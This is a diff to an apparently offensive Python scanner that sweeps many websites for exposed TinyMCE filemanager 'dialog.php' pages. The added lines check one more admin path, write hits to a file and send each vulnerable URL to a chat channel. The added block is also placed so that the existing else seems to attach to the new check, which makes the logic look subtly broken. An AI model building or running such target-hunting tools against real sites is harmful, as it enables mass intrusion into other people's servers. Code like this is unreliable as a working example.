@@ -158,6 +158,13 @@ def jamet1(url):
             print(ktngreen + '[Ok] Wp' + '(' + url + ')' + CEND)
             open('single.txt', 'a').write(url+'/js/tinymce/plugins/filemanager/dialog.php'+'\n')
             send_message("<CHAT_ID>", "GET: {}".format(url+'/js/tinymce/plugins/filemanager/dialog.php'))
+
+        cek11 = requests.get(url+'/admin/tinymce/plugins/filemanager/dialog.php', verify=False, timeout=15)
+        if '<input type="hidden" id="cur_dir" value="' in cek11.text.encode('utf-8'):
+            print(ktngreen + '[Ok] Wp' + '(' + url + ')' + CEND)
+            open('single.txt', 'a').write(url+'/admin/tinymce/plugins/filemanager/dialog.php'+'\n')
+            send_message("<CHAT_ID>", "GET: {}".format(url+'/admin/tinymce/plugins/filemanager/dialog.php'))
+
         else:
             open('failed.txt', 'a').write(url+'\n')
             print(ktnred + '[Not]Wp' + '(' + url + ')' + CEND)
